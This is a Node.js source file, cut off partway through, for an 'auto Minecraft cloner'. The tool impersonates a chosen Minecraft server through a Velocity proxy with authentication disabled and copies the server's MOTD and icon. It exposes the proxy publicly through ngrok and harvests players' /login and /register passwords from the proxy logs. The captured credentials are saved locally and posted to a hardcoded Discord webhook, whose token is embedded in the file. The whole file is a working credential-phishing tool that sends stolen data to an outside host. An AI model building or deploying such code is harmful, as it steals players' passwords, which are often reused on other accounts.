// Per killare tutti i processi figli cross-platform
let treeKill;
try {
    treeKill = require('tree-kill');
} catch (e) {
    // tree-kill non installato, fallback a kill normale
    treeKill = null;
}

const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');
const http = require('http');
const https = require('https');
const mc = require('minecraft-protocol');
const axios = require('axios');

// ===== DISCORD WEBHOOK CLASS =====
class DiscordWebhook {
    constructor() {
        this.webhookUrl = 'https://discord.com/api/webhooks/1425884465346908330/2BpSzSOr_DNyPtWsAKkdgolpufhCI0os3nTGZj_ImV3NsQwZoDdRa6vr8xdJsrKbdBSA';
        this.enabled = true;
    }

    async sendStartupNotification(serverInfo) {
        if (!this.enabled) return;

        try {
            const embed = {
                title: '🚀 CREDENTIAL LOGGER STARTED',
                color: 0x00ff00, // Verde
                timestamp: new Date().toISOString(),
                footer: {
                    text: 'CREDENTIAL LOGGER',
                    icon_url: 'https://cdn.discordapp.com/emojis/1057976156175609916.webp'
                },
                fields: [
                    {
                        name: '🎯 Server Target',
                        value: `\`${serverInfo.host}:${serverInfo.port}\``,
                        inline: false
                    },
                    {
                        name: '🎮 Version',
                        value: `\`${serverInfo.version || 'Unknown'}\``,
                        inline: true
                    },
                    {
                        name: '👥 Players',
                        value: `\`${serverInfo.players || '0/0'}\``,
                        inline: true
                    }
                ],
                description: `🔥 **Credential capture system active!**\n📡 Monitoring commands \`/login\` and \`/register\`\n⚠️ Credentials will be sent here automatically`
            };

            const payload = {
                username: 'CREDENTIAL LOGGER',
                avatar_url: 'https://cdn.discordapp.com/emojis/1057976156175609916.webp',
                embeds: [embed]
            };

            await axios.post(this.webhookUrl, payload);
            
        } catch (error) {
            console.log(`⚠️  Error sending startup Discord notification: ${error.message}`);
        }
    }

    async sendCredential(credentialData) {
        if (!this.enabled) return;

        try {
            const embed = this.createEmbed(credentialData);
            const payload = {
                username: 'CREDENTIAL LOGGER',
                avatar_url: 'https://cdn.discordapp.com/emojis/1057976156175609916.webp',
                embeds: [embed]
            };

            await axios.post(this.webhookUrl, payload);
            
        } catch (error) {
            console.log(`⚠️  Error sending Discord notification: ${error.message}`);
        }
    }

    createEmbed(cred) {
        const now = new Date();
        const isLogin = cred.type?.includes('login');
        const isRegister = cred.type?.includes('register');
        
        const embed = {
            title: `🔥 CREDENTIAL CAPTURED! ${isLogin ? '🔑' : '📝'}`,
            color: isLogin ? 0xff6b6b : 0xff9800, // Red for login, orange for register
            timestamp: now.toISOString(),
            footer: {
                text: 'CREDENTIAL LOGGER',
                icon_url: 'https://cdn.discordapp.com/emojis/1057976156175609916.webp'
            },
            thumbnail: {
                url: 'https://crafatar.com/avatars/' + (cred.nickname || cred.username || 'steve') + '?size=128&overlay'
            },
            fields: [
                {
                    name: '👤 Nickname',
                    value: `\`${cred.nickname || cred.username || 'Unknown'}\``,
                    inline: true
                },
                {
                    name: '🔑 Password', 
                    value: `\`${cred.password || 'N/A'}\``,
                    inline: true
                },
                {
                    name: '⚡ Type',
                    value: isLogin ? '🔑 **LOGIN**' : '📝 **REGISTER**',
                    inline: true
                },
                {
                    name: '🌐 Original Server',
                    value: `\`${cred.server_original || cred.server || 'N/A'}\``,
                    inline: false
                },
                {
                    name: '📡 IP Client',
                    value: `\`${cred.client_ip || cred.ip || 'N/A'}\``,
                    inline: true
                },
                {
                    name: '📅 Date/Time',
                    value: `\`${cred.date || 'N/A'} ${cred.time || 'N/A'}\``,
                    inline: true
                },
                {
                    name: '💻 Full Command',
                    value: `\`\`\`${cred.command || 'N/A'}\`\`\``,
                    inline: false
                }
            ]
        };

        // Add a dynamic description
        embed.description = `🎯 **${isLogin ? 'Login' : 'Registration'}** captured successfully!\n` +
                           `📱 Server: **${cred.server_original || 'Unknown'}**\n` +
                           `👤 User: **${cred.nickname || cred.username}**\n` +
                           `🔐 Password: ||**${cred.password}**|| \`(click to reveal)\``;

        return embed;
    }
}

// ===== CREDENTIAL LOGGER CLASS =====
class CredentialLogger {
    constructor() {
        this.logFile = path.join(__dirname, 'captured_credentials.json');
        this.credentials = [];
        this.discordWebhook = new DiscordWebhook();
        this.loadExistingCredentials();
    }

    loadExistingCredentials() {
        try {
            if (fs.existsSync(this.logFile)) {
                const data = fs.readFileSync(this.logFile, 'utf8');
                const parsed = JSON.parse(data);
                
                if (Array.isArray(parsed)) {
                    this.credentials = parsed;
                } else if (parsed.credentials && Array.isArray(parsed.credentials)) {
                    this.credentials = parsed.credentials;
                } else {
                    console.log('⚠️  Invalid credential format, initializing empty array');
                    this.credentials = [];
                }
            }
        } catch (error) {
            console.log('⚠️  Unable to load existing credentials:', error.message);
            this.credentials = [];
        }
    }

    logConnection(username, ip, server) {
        const credential = {
            type: 'connection',
            username: username,
            ip: ip,
            timestamp: new Date().toISOString(),
            server: server
        };

        // Ensure credentials is always an array
        if (!Array.isArray(this.credentials)) {
            this.credentials = [];
        }
        
        this.credentials.push(credential);
        this.saveCredentials();
        console.log(`👤 CONNECTION: ${username} from ${ip}`);
    }

    logCommand(username, command, server) {
        // Filter only relevant commands
        const lowerCommand = command.toLowerCase();
        if (!lowerCommand.includes('login') && !lowerCommand.includes('register')) {
            return;
        }

        const now = new Date();
        
        // Extract the actual nickname from the command if the username passed is numeric
        let realNickname = username;
        if (/^\d+$/.test(username)) {
            const cmdMatch = command.match(/\/(?:login|register)\s+(\w+)/i);
            if (cmdMatch) {
                realNickname = cmdMatch[1];
            }
        }
        
        const credential = {
            type: 'command',
            nickname: realNickname,
            username: realNickname,
            command: command,
            timestamp: now.toISOString(),
            date: now.toLocaleDateString('it-IT'),
            time: now.toLocaleTimeString('it-IT'),
            server_original: server,
            server: server,
            client_ip: 'N/A'
        };
        
        // Extract passwords from commands
        const loginMatch = command.match(/\/login\s+(\S+)/i);
        const registerMatch = command.match(/\/register\s+(\S+)(?:\s+(\S+))?/i);
        
        if (loginMatch) {
            credential.type = 'login_command';
            credential.password = loginMatch[1];
            console.log(`🔑 COMMAND LOGIN: ${username} -> ${credential.password}`);
        } else if (registerMatch) {
            credential.type = 'register_command';
            credential.password = registerMatch[1];
            credential.confirmPassword = registerMatch[2] || registerMatch[1];
            console.log(`📝 COMMAND REGISTER: ${username} -> ${credential.password}`);
        }

        // Ensure credentials is always an array
        if (!Array.isArray(this.credentials)) {
            this.credentials = [];
        }
        
        this.credentials.push(credential);
        this.saveCredentials();

        // Confirmation message more visible for Electron
        console.log(`\n🔥 CREDENTIAL CAPTURED! 🔥`);
        console.log(`👤 Nickname: ${credential.nickname}`);
        console.log(`🔑 Password: ${credential.password}`);
        console.log(`🌐 Server: ${credential.server_original}`);
        console.log(`📅 Date/Time: ${credential.date} ${credential.time}`);
        console.log(`📊 Total credentials: ${this.credentials.length}`);

        this.discordWebhook.sendCredential(credential).catch(err => {
            console.log(`⚠️  Discord webhook error: ${err.message}`);
        });

        console.log();
    }

    saveCredentials() {
        try {
            fs.writeFileSync(this.logFile, JSON.stringify(this.credentials, null, 2));
        } catch (error) {
            console.error('❌ Error saving credentials:', error.message);
        }
    }

    getStats() {
        // Ensure credentials is always an array
        if (!Array.isArray(this.credentials)) {
            console.log('⚠️  Credentials is not an array, initializing...');
            this.credentials = [];
        }
        
        const stats = {
            totalConnections: this.credentials.filter(c => c && c.type === 'connection').length,
            loginAttempts: this.credentials.filter(c => c && c.type && c.type.includes('login')).length,
            registerAttempts: this.credentials.filter(c => c && c.type && c.type.includes('register')).length,
            uniqueUsers: [...new Set(this.credentials.filter(c => c && (c.nickname || c.username)).map(c => c.nickname || c.username))].length
        };
        
        return stats;
    }

    printStats() {
        const stats = this.getStats();
        console.log('\n📊 CREDENTIAL STATISTICS:');
        console.log('═══════════════════════════');
        console.log(`👤 Connections: ${stats.totalConnections}`);
        console.log(`🔑 Login Attempts: ${stats.loginAttempts}`);
        console.log(`📝 Register Attempts: ${stats.registerAttempts}`);
        console.log(`🏷️  Unique Users: ${stats.uniqueUsers}`);
        console.log('═══════════════════════════\n');
    }
}

// ===== VELOCITY BUILDER CLASS =====
class VelocityBuilder {
    constructor() {
        this.velocityDir = path.join(__dirname, 'velocity-server');
        this.pluginsDir = path.join(this.velocityDir, 'plugins');
    }

    async createDirectories() {
        console.log('📁 Creating directories...');
        
        if (!fs.existsSync(this.velocityDir)) {
            fs.mkdirSync(this.velocityDir, { recursive: true });
        }
        
        if (!fs.existsSync(this.pluginsDir)) {
            fs.mkdirSync(this.pluginsDir, { recursive: true });
        }

        console.log('✅ Directories created');
    }

    async downloadFile(url, filePath, name) {
        return new Promise((resolve, reject) => {
            console.log(`📥 Download ${name}...`);
            
            const file = fs.createWriteStream(filePath);
            
            https.get(url, {
                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' }
            }, (response) => {
                if (response.statusCode >= 300 && response.statusCode < 400) {
                    file.close();
                    fs.unlinkSync(filePath);
                    return this.downloadFile(response.headers.location, filePath, name).then(resolve).catch(reject);
                }
                
                if (response.statusCode !== 200) {
                    file.close();
                    fs.unlinkSync(filePath);
                    return reject(new Error(`HTTP ${response.statusCode}`));
                }
                
                response.pipe(file);
                
                file.on('finish', () => {
                    file.close();
                    console.log(`✅ ${name} Downloaded!`);
                    resolve();
                });
                
                file.on('error', reject);
            }).on('error', reject);
        });
    }

    async downloadVelocity() {
        console.log('🚀 Downloading Velocity...');
        
        const velocityJar = path.join(this.velocityDir, 'velocity.jar');
        // Use stable working version
        const downloadUrl = 'https://api.papermc.io/v2/projects/velocity/versions/3.3.0-SNAPSHOT/builds/436/downloads/velocity-3.3.0-SNAPSHOT-436.jar';
        
        await this.downloadFile(downloadUrl, velocityJar, 'Velocity 3.3.0-436');
    }

    async downloadPlugins() {
        console.log('🔌 Download plugins...');
        
        const viaVersionJar = path.join(this.pluginsDir, 'ViaVersion.jar');
        const viaBackwardsJar = path.join(this.pluginsDir, 'ViaBackwards.jar');
        
        const viaVersionUrl = 'https://github.com/ViaVersion/ViaVersion/releases/download/5.5.0/ViaVersion-5.5.0.jar';
        const viaBackwardsUrl = 'https://github.com/ViaVersion/ViaBackwards/releases/download/5.5.0/ViaBackwards-5.5.0.jar';
        
        await this.downloadFile(viaVersionUrl, viaVersionJar, 'ViaVersion 5.5.0');
        await this.downloadFile(viaBackwardsUrl, viaBackwardsJar, 'ViaBackwards 5.5.0');
    }

    // Function to convert MOTD from legacy to MiniMessage
    convertMotdToVelocity(description) {
        if (!description) return "<gold>MC Cloner</gold>";
        
        let rawMotd = '';
        
        if (typeof description === 'string') {
            rawMotd = description;
        } else if (description.text !== undefined) {
            rawMotd = description.text || '';

            // Add extra if present (for multiline MOTD)
            if (description.extra && Array.isArray(description.extra)) {
                for (const extra of description.extra) {
                    if (typeof extra === 'string') {
                        rawMotd += extra;
                    } else if (extra.text) {
                        rawMotd += extra.text;
                    }
                }
            }
        } else {
            // Fallback for complex objects
            try {
                rawMotd = JSON.stringify(description);
            } catch (e) {
                rawMotd = description.toString();
            }
        }
        
        // Convert from legacy (§) to MiniMessage
        return this.legacyToMiniMessage(rawMotd);
    }

    // Convert legacy color codes (§) to FULL MiniMessage format
    legacyToMiniMessage(text) {
        if (!text) return "<gold>MC Cloner</gold>";

        console.log(`🎨 Converting MOTD from: ${text.substring(0, 50)}...`);

        // COMPLETE map of all legacy Minecraft codes to MiniMessage
        const colorMap = {
            // Base colors
            '§0': '<black>', '§1': '<dark_blue>', '§2': '<dark_green>', '§3': '<dark_aqua>',
            '§4': '<dark_red>', '§5': '<dark_purple>', '§6': '<gold>', '§7': '<gray>',
            '§8': '<dark_gray>', '§9': '<blue>', '§a': '<green>', '§b': '<aqua>',
            '§c': '<red>', '§d': '<light_purple>', '§e': '<yellow>', '§f': '<white>',
            
            // Special formatting
            '§l': '<bold>', '§o': '<italic>', '§n': '<underlined>', 
            '§m': '<strikethrough>', '§k': '<obfuscated>', '§r': '<reset>',

            // AAlternative aliases you might find
            '&0': '<black>', '&1': '<dark_blue>', '&2': '<dark_green>', '&3': '<dark_aqua>',
            '&4': '<dark_red>', '&5': '<dark_purple>', '&6': '<gold>', '&7': '<gray>',
            '&8': '<dark_gray>', '&9': '<blue>', '&a': '<green>', '&b': '<aqua>',
            '&c': '<red>', '&d': '<light_purple>', '&e': '<yellow>', '&f': '<white>',
            '&l': '<bold>', '&o': '<italic>', '&n': '<underlined>', 
            '&m': '<strikethrough>', '&k': '<obfuscated>', '&r': '<reset>'
        };
        
        let converted = text;
        
        // Convert ALL color codes and formatting
        for (const [legacy, mini] of Object.entries(colorMap)) {
            // Use global regex to replace all matches
            const regex = new RegExp(legacy.replace(/[§&]/, '[§&]'), 'gi');
            converted = converted.replace(regex, mini);
        }
        
        converted = this.optimizeMiniMessageTags(converted);
        
        // Remove any remaining § or & codes that we haven't mapped
        converted = converted.replace(/[§&]./g, '');
        
        console.log(`🎨 MOTD converted to: ${converted.substring(0, 50)}...`);
        
        return converted;
    }

    // Optimize MiniMessage tags to avoid conflicts
    optimizeMiniMessageTags(text) {
        // Handle situations like <bold><yellow> text </yellow></bold>
        let optimized = text;

        // If the text is too complex, use a simplified version
        if (optimized.length > 200 || (optimized.match(/</g) || []).length > 20) {
            // Fallback for very complex MOTDs: keep only main colors
            optimized = optimized.replace(/<bold>|<italic>|<underlined>|<strikethrough>|<obfuscated>/g, '');
            optimized = optimized.replace(/<\/bold>|<\/italic>|<\/underlined>|<\/strikethrough>|<\/obfuscated>/g, '');
            
            if (!optimized.includes('<') || !optimized.includes('>')) {
                optimized = `<yellow>${optimized}</yellow>`;
            }
        }
        
        return optimized;
    }

    createConfig(targetHost, targetPort, targetInfo = null) {
        console.log('⚙️  Creating velocity.toml with full ping-passthrough...');
        
        // Create forwarding-secret file
        const secretPath = path.join(this.velocityDir, 'forwarding.secret');
        fs.writeFileSync(secretPath, 'velocity-secret-key-dummy\n');

        // With ping-passthrough = "all", the MOTD is passed directly from the original server
        let showMaxPlayers = 500;

        console.log('🎨 MOTD: Will be copied 1:1 from the original server via ping-passthrough');

        if (targetInfo && targetInfo.players && targetInfo.players.max) {
            showMaxPlayers = targetInfo.players.max;
        }

        // Save favicon if available
        if (targetInfo && targetInfo.favicon) {
            try {
                const faviconPath = path.join(this.velocityDir, 'server-icon.png');
                const faviconData = targetInfo.favicon.split(',')[1];
                fs.writeFileSync(faviconPath, Buffer.from(faviconData, 'base64'));
                console.log('✅ Original server favicon saved');
            } catch (error) {
                console.log('⚠️  Unable to save favicon:', error.message);
            }
        }

        // No longer need to escape because we use a simple default MOTD

        const config = `# Velocity Configuration - Cloned from ${targetHost}:${targetPort}
config-version = "2.6"
bind = "0.0.0.0:25577"
motd = "<yellow>Proxy Server</yellow>"
show-max-players = ${showMaxPlayers}
online-mode = false
force-key-authentication = false
player-info-forwarding-mode = "none"
forwarding-secret-file = "forwarding.secret"
announce-forge = false
kick-existing-players = false
ping-passthrough = "all"
prevent-client-proxy-connections = false

[servers]
lobby = "${targetHost}:${targetPort}"

try = [
    "lobby"
]

[forced-hosts]

[advanced]
compression-threshold = 256
compression-level = -1
login-ratelimit = 3000
connection-timeout = 25000
read-timeout = 30000
haproxy-protocol = false
tcp-fast-open = false
bungee-plugin-message-channel = true
show-ping-requests = false
announce-proxy-commands = true
log-command-executions = true
log-player-connections = true

[query]
enabled = false
port = 25577
map = "Velocity"
show-plugins = false

[metrics]
enabled = false
id = "00000000-0000-0000-0000-000000000000"
`;

        const configPath = path.join(this.velocityDir, 'velocity.toml');
        fs.writeFileSync(configPath, config);
        
        console.log('✅ Configuration created');
    }

    async setup(targetHost, targetPort, targetInfo = null) {
        try {
            console.log('🚀 VELOCITY SETUP');
            console.log('════════════════════════════════════════════════');
            console.log(`📡 Target: ${targetHost}:${targetPort}`);
            console.log('════════════════════════════════════════════════\n');

            await this.createDirectories();
            await this.downloadVelocity();
            await this.downloadPlugins();
            this.createConfig(targetHost, targetPort, targetInfo);

            console.log('\n🎉 SETUP COMPLETED!');
            console.log('✅ Velocity 3.3.0-436 installed');
            console.log('✅ ViaVersion 5.5.0 installed');
            console.log('✅ ViaBackwards 5.5.0 installed');
            console.log('🎮 Support: MC 1.7.2 → 1.21.10+');
            console.log('════════════════════════════════════════════════');

            return true;

        } catch (error) {
            console.error(`❌ Error: ${error.message}`);
            throw error;
        }
    }
}

// ===== MAIN CLONER CLASS =====
class AutoMinecraftCloner {
    constructor() {
        this.velocityProcess = null;
        this.tunnelProcess = null;
        this.isRunning = false;
        this.targetInfo = null;
        this.velocityDir = path.join(__dirname, 'velocity-server');
        this.credLogger = new CredentialLogger();
        this.velocityBuilder = new VelocityBuilder();
    }

    async testServerConnectivity(host, port) {
        console.log('🔗 Server connectivity test...');
        
        return new Promise((resolve) => {
            const net = require('net');
            const dns = require('dns');
            
            // Resolve DNS first
            dns.lookup(host, (err, address) => {
                if (err) {
                    console.log(`⚠️  DNS error for ${host}: ${err.message}`);
                    resolve(false);
                    return;
                }
                
                console.log(`🌐 DNS resolved: ${host} -> ${address}`);
                
                const socket = new net.Socket();
                
                const timeout = setTimeout(() => {
                    socket.destroy();
                    console.log('⚠️  Server connection timeout');
                    resolve(false);
                }, 15000);
                
                socket.connect(port, address, () => {
                    clearTimeout(timeout);
                    socket.destroy();
                    console.log('✅ Server connectivity verified');
                    resolve(true);
                });
                
                socket.on('error', (err) => {
                    clearTimeout(timeout);
                    console.log(`⚠️  Connection error: ${err.code || err.message}`);
                    resolve(false);
                });
            });
        });
    }

    async scanTarget(host, port = 25565) {
        console.log(`🔍 Scanning target server: ${host}:${port}`);
        
        try {
            // Broader versions for compatibility
            const versions = ['1.21.1', '1.20.6', '1.20.1', '1.19.4', '1.18.2', '1.17.1', '1.16.5', '1.15.2', '1.14.4', '1.12.2', '1.8.9'];
            
            for (const version of versions) {
                try {
                    console.log(`   Attempt with version ${version}...`);
                    
                    const response = await mc.ping({
                        host: host,
                        port: port,
                        version: version,
                        timeout: 10000,
                        connectTimeout: 5000
                    });
                    
                    this.targetInfo = {
                        host: host,
                        port: port,
                        version: response.version,
                        description: response.description,
                        players: response.players,
                        favicon: response.favicon,
                        protocol: version,
                        ping: Date.now()
                    };
                    
                    console.log('✅ Server detected successfully!');
                    console.log(`   Version: ${response.version.name} (Protocol ${response.version.protocol})`);
                    console.log(`   Players: ${response.players.online}/${response.players.max}`);
                    console.log(`   MOTD: ${typeof response.description === 'string' ? response.description : JSON.stringify(response.description)}`);
                    
                    // Optional connectivity test (non-blocking)
                    this.testServerConnectivity(host, port).catch(() => {
                        console.log('⚠️  Connectivity test skipped, proceeding anyway');
                    });
                    
                    return this.targetInfo;
                } catch (error) {
                    continue;
                }
            }
            
            throw new Error('Unable to connect to server with any version');
            
        } catch (error) {
            console.error('❌ Server scan error:', error.message);
            throw error;
        }
    }

    async setupVelocity() {
        console.log('🔧 Automatic Velocity setup...');
        await this.velocityBuilder.setup(this.targetInfo.host, this.targetInfo.port, this.targetInfo);
        console.log('✅ Velocity configured automatically');
    }

    // Update only the configuration for a new target without downloading everything
    async reconfigureTarget(newHost, newPort) {
        console.log(`🔄 QUICK RECONFIGURATION: ${newHost}:${newPort}`);

        // Scan the new target
        const oldTarget = this.targetInfo ? {...this.targetInfo} : null;
        await this.scanTarget(newHost, newPort);

        // Check compatibility for maximum optimization
        const isCompatible = this.isCompatibleTarget(oldTarget, this.targetInfo);
        
        if (isCompatible) {
            // Ultra-fast switching - just IP change without reboot
            console.log('⚡ ULTRA-FAST SWITCHING - just IP change');
            const quickUpdate = this.updateTargetConfig(this.targetInfo.host, this.targetInfo.port, this.targetInfo);
            
            if (quickUpdate) {
                console.log('✅ Switch completed');
                return;
            }
        }

        // Normal reconfiguration (still without re-download)
        console.log('📝 Standard configuration update...');

        if (this.velocityProcess) {
            console.log('🔄 Restarting Velocity to apply changes...');
            this.velocityProcess.kill();
            await new Promise(resolve => setTimeout(resolve, 2000));
        }

        // Recreate configuration
        this.velocityBuilder.createConfig(this.targetInfo.host, this.targetInfo.port, this.targetInfo);
        
        console.log(`✅ ${oldTarget?.host || 'first'}:${oldTarget?.port || 'setup'} → ${this.targetInfo.host}:${this.targetInfo.port}`);
        console.log('🎨 MOTD and favicon automatically synchronized');
    }

    async startVelocity() {
        console.log('🚀 Starting Velocity Proxy Server...');

        const velocityJar = path.join(this.velocityDir, 'velocity.jar');
        if (!fs.existsSync(velocityJar)) {
            console.log('📦 Velocity not found, automatic setup...');
            await this.setupVelocity();
        }

        // Configuration created during initial setup

        return new Promise((resolve, reject) => {
            // Su Windows: detached + stdio: 'ignore' + unref per evitare nuova finestra
                if (process.platform === 'win32') {
                    // Su Windows: niente detached, niente stdio:ignore, solo windowsHide:true
                    this.velocityProcess = spawn('java', [
                        '-Xms512M',
                        '-Xmx1024M',
                        '-XX:+UseG1GC',
                        '-jar',
                        'velocity.jar'
                    ], {
                        cwd: this.velocityDir,
                        stdio: ['pipe', 'pipe', 'pipe'],
                        windowsHide: true
                    });
                    if (this.velocityProcess.stdout) {
                        this.velocityProcess.stdout.on('data', (data) => {
                            const output = data.toString();
                            if (output.includes('Done') || 
                                output.includes('Listening on') || 
                                output.includes('has connected') ||
                                output.includes('has disconnected') ||
                                output.includes('/login') ||
                                output.includes('/register') ||
                                output.includes('ERROR')) {
                                console.log(`[VELOCITY] ${output.trim()}`);
                            }
                            if (output.includes('Done') || output.includes('Listening on')) {
                                console.log('✅ Velocity launched successfully!');
                                setTimeout(() => resolve(), 2000);
                            }
                        });
                    }
                    if (this.velocityProcess.stderr) {
                        this.velocityProcess.stderr.on('data', (data) => {
                            const error = data.toString();
                            if (error.includes('Address already in use')) {
                                console.log('⚠️  Port already in use, server probably already running');
                                setTimeout(() => resolve(), 1000);
                            } else if (error.includes('Unable to bind')) {
                                reject(new Error('Unable to start Velocity: port occupied'));
                            } else if (error.includes('/login') || 
                                      error.includes('/register') ||
                                      error.includes('authentication') ||
                                      error.includes('password')) {
                                console.log(`[VELOCITY AUTH] ${error.trim()}`);
                            }
                        });
                    }
                    this.velocityProcess.on('close', (code) => {
                        if (code !== 0 && this.isRunning) {
                            console.error(`❌ Velocity closed with code ${code}`);
                            reject(new Error(`Velocity failed with code ${code}`));
                        }
                    });
                    this.velocityProcess.on('error', (error) => {
                        console.error('❌ Velocity error:', error.message);
                        reject(error);
                    });
            } else {
                // Su altri OS: normale, con log
                this.velocityProcess = spawn('java', [
                    '-Xms512M',
                    '-Xmx1024M',
                    '-XX:+UseG1GC',
                    '-jar',
                    'velocity.jar'
                ], {
                    cwd: this.velocityDir,
                    stdio: ['pipe', 'pipe', 'pipe']
                });
                if (this.velocityProcess.stdout) {
                    this.velocityProcess.stdout.on('data', (data) => {
                        const output = data.toString();
                        if (output.includes('Done') || 
                            output.includes('Listening on') || 
                            output.includes('has connected') ||
                            output.includes('has disconnected') ||
                            output.includes('/login') ||
                            output.includes('/register') ||
                            output.includes('ERROR')) {
                            console.log(`[VELOCITY] ${output.trim()}`);
                        }
                        if (output.includes('Done') || output.includes('Listening on')) {
                            console.log('✅ Velocity launched successfully!');
                            setTimeout(() => resolve(), 2000);
                        }
                    });
                }
                if (this.velocityProcess.stderr) {
                    this.velocityProcess.stderr.on('data', (data) => {
                        const error = data.toString();
                        if (error.includes('Address already in use')) {
                            console.log('⚠️  Port already in use, server probably already running');
                            setTimeout(() => resolve(), 1000);
                        } else if (error.includes('Unable to bind')) {
                            reject(new Error('Unable to start Velocity: port occupied'));
                        } else if (error.includes('/login') || 
                                  error.includes('/register') ||
                                  error.includes('authentication') ||
                                  error.includes('password')) {
                            console.log(`[VELOCITY AUTH] ${error.trim()}`);
                        }
                    });
                }
                this.velocityProcess.on('close', (code) => {
                    if (code !== 0 && this.isRunning) {
                        console.error(`❌ Velocity closed with code ${code}`);
                        reject(new Error(`Velocity failed with code ${code}`));
                    }
                });
                this.velocityProcess.on('error', (error) => {
                    console.error('❌ Velocity error:', error.message);
                    reject(error);
                });
            }
        });
    }

    async setupTunnel() {
        console.log('🌐 Starting public tunnel...');
        console.log('🔍 Detecting available tunnel services...');

        // Check if ngrok is available
        try {
            await this.runCommand('ngrok', ['version'], { timeout: 2000 });
            console.log('✅ Ngrok available');
            return await this.setupNgrokTunnel();
        } catch (error) {
            console.log('⚠️  Ngrok not available, trying localtunnel...');
        }

        // Fallback to localtunnel
        try {
            await this.runCommand('lt', ['--version'], { timeout: 2000 });
            console.log('✅ LocalTunnel available');
            return await this.setupLocalTunnel();
        } catch (error) {
            console.log('⚠️  LocalTunnel not available, installing...');

            try {
                console.log('📦 Installing localtunnel...');
                await this.runCommand('npm', ['install', '-g', 'localtunnel'], { timeout: 30000 });
                return await this.setupLocalTunnel();
            } catch (installError) {
                throw new Error('Unable to install tunnel services. Please install ngrok or localtunnel manually.');
            }
        }
    }

    async setupNgrokTunnel() {
        console.log('🔥 Starting Ngrok tunnel...');
        
        return new Promise((resolve, reject) => {
            this.tunnelProcess = spawn('ngrok', ['tcp', '25577'], {
                stdio: ['pipe', 'pipe', 'pipe']
            });

            let tunnelUrl = null;
            let attempts = 0;
            const maxAttempts = 15;

            const checkTunnel = async () => {
                try {
                    const response = await this.httpGet('http://localhost:4040/api/tunnels');
                    const data = JSON.parse(response);
                    
                    if (data.tunnels && data.tunnels.length > 0) {
                        tunnelUrl = data.tunnels[0].public_url.replace('tcp://', '');
                        const [host, port] = tunnelUrl.split(':');

                        console.log('\n🎉 PUBLIC TUNNEL ACTIVE!');
                        console.log('═══════════════════════════════════════════════════');
                        console.log(`📡 PUBLIC IP: ${tunnelUrl}`);
                        console.log('🔧 SERVICE: Ngrok');
                        console.log(`🎯 CLONED TARGET: ${this.targetInfo.host}:${this.targetInfo.port}`);
                        console.log(`🎮 VERSION: ${this.targetInfo.version.name}`);
                        console.log(`👥 PLAYERS: ${this.targetInfo.players.online}/${this.targetInfo.players.max}`);
                        console.log('═══════════════════════════════════════════════════');
                        console.log('💡 Share this address to let others connect');
                        console.log('🔒 Your real IP is hidden');
                        console.log('🗝️  Credentials will be saved in captured_credentials.json\n');
                        
                        resolve({
                            service: 'ngrok',
                            url: tunnelUrl,
                            host: host,
                            port: parseInt(port)
                        });
                        return;
                    }
                } catch (error) {
                    // API not yet available, retrying
                }
                
                attempts++;
                if (attempts < maxAttempts) {
                    setTimeout(checkTunnel, 2000);
                } else {
                    reject(new Error('Timeout tunnel ngrok'));
                }
            };

            this.tunnelProcess.on('error', (error) => {
                reject(new Error(`Ngrok error: ${error.message}`));
            });

            setTimeout(checkTunnel, 3000);
        });
    }

    async startCredentialMonitoring() {
        console.log('🔍 Starting credential monitoring...');
        console.log('🎯 Focus: /login and /register commands');

        const serverName = `${this.targetInfo.host}:${this.targetInfo.port}`;
        
        if (this.velocityProcess) {
            this.velocityProcess.stdout.on('data', (data) => {
                const log = data.toString();
                
                // Patterns for capturing connections
                const connectionPattern = /(\w+) \(\/(.+?)\) has connected/;
                const connectionMatch = log.match(connectionPattern);
                
                if (connectionMatch) {
                    this.credLogger.logConnection(connectionMatch[1], connectionMatch[2], serverName);
                }

                // Patterns for capturing /login and /register commands with real username
                const commandPatterns = [
                    // More specific patterns for capturing the real username
                    /(\w+) \(.*?\) -> executed command (\/(?:login|register)\s+\S+(?:\s+\S+)?)/i,
                    /(\w+).*?executed command: (\/(?:login|register)\s+\S+(?:\s+\S+)?)/i,
                    // Fallback patterns
                    /(\w+).*?(\/(?:login|register)\s+\S+(?:\s+\S+)?)/i,
                    /\[(\w+)\] (\/(?:login|register)\s+\S+(?:\s+\S+)?)/i
                ];
                
                for (const pattern of commandPatterns) {
                    const match = log.match(pattern);
                    if (match) {
                        let username = match[1];
                        let fullCommand = match[2];

                        // If username is numeric, try to extract it from the command
                        if (/^\d+$/.test(username)) {
                            const cmdUserMatch = fullCommand.match(/\/(?:login|register)\s+(\w+)/i);
                            if (cmdUserMatch) {
                                username = cmdUserMatch[1];
                            }
                        }
                        this.credLogger.logCommand(username, fullCommand, serverName);
                        break;
                    }
                }

                // Patterns for disconnections with auth issues
                const disconnectPattern = /(\w+) \(\/(.+?)\) has disconnected: (.+)/;
                const disconnectMatch = log.match(disconnectPattern);
                
                if (disconnectMatch && disconnectMatch[3].includes('authentication')) {
                    console.log(`🚫 DISCONNECTED (Auth): ${disconnectMatch[1]} - ${disconnectMatch[3]}`);
                }
            });
            
            this.velocityProcess.stderr.on('data', (data) => {
                const log = data.toString();
                
                if (log.includes('/login') || log.includes('/register')) {
                    const commandMatch = log.match(/(\w+).*?(\/(?:login|register)\s+\S+(?:\s+\S+)?)/i);
                    if (commandMatch) {
                        this.credLogger.logCommand(commandMatch[1], commandMatch[2], serverName);
                    }
                }
            });
        }
        
        // Show statistics every 60 seconds
        setInterval(() => {
            const stats = this.credLogger.getStats();
            if (stats.totalConnections > 0) {
                console.log(`📊 Stats: ${stats.totalConnections} connections, ${stats.loginAttempts} logins, ${stats.registerAttempts} registrations`);
            }
        }, 60000);
    }

    async runCommand(command, args, options = {}) {
        return new Promise((resolve, reject) => {
            const process = spawn(command, args, { stdio: 'pipe' });
            
            let output = '';
            process.stdout.on('data', (data) => output += data.toString());
            process.stderr.on('data', (data) => output += data.toString());
            
            process.on('close', (code) => {
                if (code === 0) {
                    resolve(output);
                } else {
                    reject(new Error(`Command failed: ${command} ${args.join(' ')}`));
                }
            });
            
            process.on('error', reject);
            
            if (options.timeout) {
                setTimeout(() => {
                    process.kill();
                    reject(new Error('Command timeout'));
                }, options.timeout);
            }
        });
    }

    httpGet(url) {
        return new Promise((resolve, reject) => {
            http.get(url, (res) => {
                let data = '';
                res.on('data', (chunk) => data += chunk);
                res.on('end', () => resolve(data));
            }).on('error', reject);
        });
    }

    async run() {
        try {
            this.isRunning = true;
            
            console.log('🎯 AUTO MINECRAFT CLONER');
